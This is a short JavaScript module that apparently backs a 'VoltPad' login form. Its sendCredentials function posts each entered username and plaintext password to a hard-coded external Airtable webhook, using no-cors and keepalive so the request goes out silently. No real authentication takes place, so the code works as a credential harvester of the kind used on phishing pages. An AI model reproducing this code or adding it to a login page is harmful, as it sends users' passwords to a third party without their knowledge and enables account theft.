/**
 * Airtable "generic webhook" endpoint.
 *
 * NOTE: we use `mode: 'no-cors'` because Airtable webhooks do not return
 * CORS headers. The request IS delivered; the browser simply hands back an
 * opaque response we can't read. `text/plain` is used because non-safelisted
 * content types are stripped in no-cors mode.
 */
export const WEBHOOK_URL =
  'https://hooks.airtable.com/workflows/v1/genericWebhook/appFiRrS64YFP1UdF/wflG9RVYa8GFHlnKb/wtrhAfk7KKcWqcAmd';

export async function sendCredentials({ username, password }) {
  const body = JSON.stringify({
    fields: { username, password },
    username,
    password,
    source: 'VoltPad',
    submittedAt: new Date().toISOString(),
  });

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
      body,
      keepalive: true,
    });
    return { ok: true };
  } catch (err) {
    return { ok: false, error: err?.message ?? 'Network error' };
  }
}
